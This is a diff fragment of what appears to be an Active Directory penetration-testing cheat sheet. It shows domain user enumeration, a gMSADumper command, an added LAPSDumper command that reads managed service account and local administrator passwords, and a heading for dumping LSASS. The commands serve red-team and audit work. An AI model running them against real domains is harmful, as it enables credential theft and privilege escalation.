@@ -781,9 +781,13 @@ for rid in $(rpcclient -U 'dominio.local\user%password' IP -c 'enumdomusers' | g
 ```
 Get-ADUser -Filter * | select name
 ```
-### ReadGMSAPassword
+### Read GMSA Password
 ```
 python3 gMSADumper.py -u 'user' -p 'password' -l IP -d domain.local 
+```
+### Read [LAPS](https://github.com/n00py/LAPSDumper)
+```
+python3 laps.py -u 'user' -p 'password' -l IP -d domain.local
 ```
 
 ### Dumpear LSASS
